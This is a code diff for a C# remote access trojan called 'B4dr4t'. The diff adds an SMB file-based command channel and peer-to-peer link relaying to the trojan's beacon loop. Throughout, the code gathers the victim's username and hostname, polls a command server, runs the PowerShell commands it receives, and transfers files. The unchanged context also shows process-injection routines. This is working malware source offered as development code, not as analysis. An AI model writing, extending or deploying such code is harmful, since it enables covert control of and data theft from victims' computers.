@@ -11,7 +11,7 @@ using Newtonsoft.Json.Linq;
 using System.Collections.ObjectModel;
 using System.Management.Automation;
 using System.Runtime.InteropServices;
-using System.Collections.Generic;
+using System.Collections;
 
 
 // Make sure to include the Powershell DLL file as a reference before compiling this project.
@@ -28,7 +28,7 @@ namespace B4dr4t
         readonly static string un = WindowsIdentity.GetCurrent().Name.Split('\\')[1];
         readonly static string hn = Dns.GetHostName();
         readonly static string type = "c#";
-        readonly static int sleepytime = 3000;
+        readonly static int sleepytime = 2000;
 
 
         private static UInt32 MEM_COMMIT = 0x1000;
@@ -302,6 +302,31 @@ namespace B4dr4t
             ResumeThread(ThreadHandle);
             return "[*] Wrote " + data.Length + " bytes to new process " + pi.dwProcessId;
         }
+        public static string Post(string home, string resp, HttpClient client) // handles HTTP and SMB post
+        {
+            string json = null;
+            if (home.StartsWith("http")) // http post
+            {
+                HttpResponseMessage postResults = client.PostAsync(home, new StringContent(resp)).Result;
+                string serverMsg = postResults.Content.ReadAsStringAsync().Result;
+                json = "{" + string.Join("{", serverMsg.Split('{').Skip(1).ToArray()).Split('\n')[0];
+
+            }
+            else // SMB file post
+            {
+                if(!File.Exists(home))
+                {
+                    File.WriteAllText(home, "");
+                }
+                string updata = File.ReadAllText(home);
+                if(updata == "" || updata != resp)
+                {
+                    json = updata;
+                    File.WriteAllText(home, resp);
+                }
+            }
+            return json;
+        }
         public static void Main(string[] args)
         {
             string home;
@@ -324,33 +349,56 @@ namespace B4dr4t
             }
             Globl.HOME[0] = home;
 
-
-
             HttpClient client = new HttpClient();
-
             PowerShell ps = PowerShell.Create();
-
             Collection<PSObject> output = null;
-
             JObject jsObject = new JObject();
+            ArrayList links = new ArrayList();
+            string resp = "{\"p\":[ {\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"hn\": \"" + hn + "\"} ] }";
 
             while (true)
             {
-               try
-               {
-                    string resp = "{\"p\":[ {\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"hn\": \"" + hn + "\"} ] }";
-                    HttpResponseMessage postResults = client.PostAsync(home, new StringContent(resp)).Result;
+                try
+                {
+                    string jString = Post(home, resp, client);
 
-                    string serverMsg = postResults.Content.ReadAsStringAsync().Result;
-                    string jString = "{" + string.Join("{", serverMsg.Split('{').Skip(1).ToArray()).Split('\n')[0];
+                    if (jString == null || jString == "")
+                    { // smb post is the same as it was last time ... pass
+                        Thread.Sleep(sleepytime);
+                        continue;
+                    }
 
+                    resp = "{\"p\":[ "; // start building response
+                    bool recv_package = false;
+
+                    // check linked peers
+                    if (links.Count > 0)
+                    {
+                        foreach (string link in links)
+                        {
+                            try
+                            {
+                                string updata = null;
+                                updata = File.ReadAllText(link);
+                                if (updata != jString)
+                                {
+                                    JObject updata_dict = JObject.Parse(updata);
+                                    resp += string.Join(",", updata_dict["p"]).ToString().Replace("\r", "").Replace("\n", "").Replace(" ", "") + ","; //add peer packages to the response
+                                    File.WriteAllText(link, jString); //write data back to the linked file
+                                }
+                            }
+                            catch {
+                            }
+                        }
+                    }
                     jsObject = JObject.Parse(jString);
-                    var test = Newtonsoft.Json.JsonConvert.DeserializeObject<Dictionary<string, List<Dictionary<string,string>>>>(jString);
+                    jString = null;
+
                     foreach (var package in jsObject["p"])
                     {
                         if (package["id"].ToString() == id)
                         {
-
+                            recv_package = true;
                             cmnd = package["cmnd"].ToString();
                             if (cmnd != "") // If cmnd is not empty string ("")
                             {
@@ -437,6 +485,39 @@ namespace B4dr4t
                                         retval = "[-] Could not write file " + filename;
                                     }
                                 }
+                                else if (cmnd.Split(' ')[0] == "li") // link
+                                {
+                                    string filename = string.Join(" ", cmnd.Split(' ').Skip(1).Take(cmnd.Length).ToArray());
+                                    if(!links.Contains(filename))
+                                    {
+                                        links.Add(filename);
+                                        retval = "[*] Added link to: " + filename;
+                                    }
+                                }
+                                else if (cmnd.Split(' ')[0] == "ul")
+                                {
+                                    //Download a file -- Send a file from the rat to the server
+                                    string filename = string.Join(" ", cmnd.Split(' ').Skip(1).Take(cmnd.Length).ToArray());
+                                    if(links.Contains(filename))
+                                    {
+                                        links.Remove(filename);
+                                        retval = "[*] Removed link to: " + filename;
+                                    }
+                                    else if(filename == "all")
+                                    {
+                                        links.Clear();
+                                        Console.WriteLine("num of links: " + links.Count);
+                                        foreach(var link in links)
+                                        {
+                                            Console.WriteLine(link);
+                                        }
+                                        retval = "[*] Removed all links";
+                                    }
+                                    else
+                                    {
+                                        retval = "[!] No such link to remove: " + filename;
+                                    }
+                                }
                                 else // Execute (Power)shell command
                                 {
                                     if (cmnd.StartsWith("cd "))
@@ -462,7 +543,7 @@ namespace B4dr4t
                                 // Should just replace with a function that returns a base64 encoded string based off of typeof() but whatever
                                 if (rettype == "dl")
                                 {
-                                    resp = "{\"p\":[ { \"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"hn\": \"" + hn + "\", \"" + rettype + "\": \"" + Convert.ToBase64String(retdata) + "\"} ] }";
+                                    resp += "{ \"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"hn\": \"" + hn + "\", \"" + rettype + "\": \"" + Convert.ToBase64String(retdata) + "\"} ] }";
                                 }
                                 else
                                 {
@@ -470,18 +551,30 @@ namespace B4dr4t
                                     {
                                         retval = "[*] No output returned";
                                     }
-                                    resp = "{\"p\":[ {\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"hn\": \"" + hn + "\", \"" + rettype + "\": \"" + Convert.ToBase64String(Encoding.UTF8.GetBytes(retval)) + "\"} ] }";
+                                    resp += "{\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"hn\": \"" + hn + "\", \"" + rettype + "\": \"" + Convert.ToBase64String(Encoding.UTF8.GetBytes(retval)) + "\"} ] }";
                                 }
-                                retval = string.Empty;
-                                postResults = client.PostAsync(home, new StringContent(resp)).Result;
+                            }
+                            else
+                            {
+                                resp += "{\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"hn\": \"" + hn + "\"} ] }";
                             }
                         }
+
+                        retval = string.Empty;
+                        cmnd = string.Empty;
+                    }
+                    if (!recv_package)
+                    {
+                        resp += "{\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"hn\": \"" + hn + "\"} ] }";
                     }
                     Thread.Sleep(sleepytime);
-               }
-               catch
-               {
-                    Thread.Sleep(sleepytime);
+                }
+
+                catch(Exception ex)
+                {
+                   resp = "{\"p\":[ {\"type\": \"" + type + "\", \"id\": \"" + id + "\", \"un\": \"" + un + "\", \"hn\": \"" + hn + "\"} ] }"; // case something goes wrong
+                   Console.WriteLine(ex.Message);
+                   Thread.Sleep(sleepytime);
                }
             }
         }
